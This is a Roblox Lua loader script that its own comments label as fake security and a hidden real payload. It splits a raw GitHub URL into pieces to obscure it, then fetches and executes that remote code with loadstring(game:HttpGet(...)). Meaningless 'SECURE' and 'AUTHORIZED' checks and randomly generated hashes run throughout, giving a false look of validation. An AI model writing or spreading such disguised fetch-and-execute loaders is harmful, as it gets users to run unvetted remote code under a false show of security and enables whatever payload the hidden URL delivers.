-----------------------------------------
-- METADATA (FAKE RUNTIME IDENTITY)
-----------------------------------------

local Identity = {}
Identity.author = "by: ig: erickmth__"
Identity.sessionId = tostring(math.random(100000,999999)) .. "-" .. tostring(os.clock())
Identity.level = "PRIVATE"
Identity.valid = true

print("[SYSTEM]", Identity.author)
task.wait(0.2)

-----------------------------------------
-- PART 1 — FAKE SECURITY CORE
-----------------------------------------

local SecurityCore = {}
SecurityCore.state = {}
SecurityCore.state.integrity = true
SecurityCore.state.environment = "SECURE"
SecurityCore.state.executor = "AUTHORIZED"

local function generateFakeHash()
    local out = ""
    for i = 1, 96 do
        out = out .. string.char(math.random(97, 102))
    end
    return out
end

SecurityCore.hash = generateFakeHash()

task.wait(0.25)

if SecurityCore.state.integrity ~= true then
    while true do end
end

-----------------------------------------
-- PART 2 — REAL PAYLOAD (SPLIT HARD)
-----------------------------------------

local urlPartA = "https://raw.githubusercontent.com/"
task.wait(0.15)

local urlPartB = "erickmth/"
task.wait(0.15)

local urlPartC = "scriptfinal/"
task.wait(0.15)

local urlPartD = "refs/heads/main/"
task.wait(0.15)

local urlPartE = "lua.lua"
task.wait(0.15)

local PayloadURL = ""
PayloadURL = PayloadURL .. urlPartA
PayloadURL = PayloadURL .. urlPartB
PayloadURL = PayloadURL .. urlPartC
PayloadURL = PayloadURL .. urlPartD
PayloadURL = PayloadURL .. urlPartE

-----------------------------------------
-- PART 3 — FAKE VALIDATION + EXECUTION
-----------------------------------------

local Validator = {}

function Validator:checkEnvironment()
    task.wait(0.2)
    return SecurityCore.state.environment == "SECURE"
end

function Validator:checkExecutor()
    task.wait(0.2)
    return SecurityCore.state.executor == "AUTHORIZED"
end

function Validator:checkSession()
    task.wait(0.2)
    return #Identity.sessionId > 10
end

local results = {
    Validator:checkEnvironment(),
    Validator:checkExecutor(),
    Validator:checkSession()
}

for _, result in pairs(results) do
    if result ~= true then
        while true do end
    end
end

task.wait(0.3)

local LoaderFunction = loadstring(game:HttpGet(PayloadURL))
LoaderFunction()

-----------------------------------------
-- FAKE BACKGROUND MONITOR
-----------------------------------------

task.spawn(function()
    while true do
        task.wait(12)
        SecurityCore.hash = generateFakeHash()
    end
end)
